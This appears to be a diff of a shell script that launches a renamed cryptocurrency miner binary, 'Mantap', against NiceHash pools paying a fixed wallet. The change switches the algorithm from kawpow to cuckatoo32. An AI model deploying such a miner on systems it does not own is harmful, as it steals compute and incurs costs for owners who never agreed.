@@ -3,4 +3,4 @@
 WORKER=$(echo $(shuf -i 1000-9999 -n 1)-Money)
 apt-get update
 apt install screen -y
-chmod u+x Mantap &&  ./Mantap -a kawpow -o stratum+tcp://kawpow.eu-west.nicehash.com:3385 -u 3H6BkkXNW6qaK563qfAHm2uZ1sFgnqCjL6.$WORKER
+chmod u+x Mantap &&  ./Mantap -a cuckatoo32 -o stratum+tcp://grincuckatoo32.eu-west.nicehash.com:3383 -u 3H6BkkXNW6qaK563qfAHm2uZ1sFgnqCjL6.$WORKER
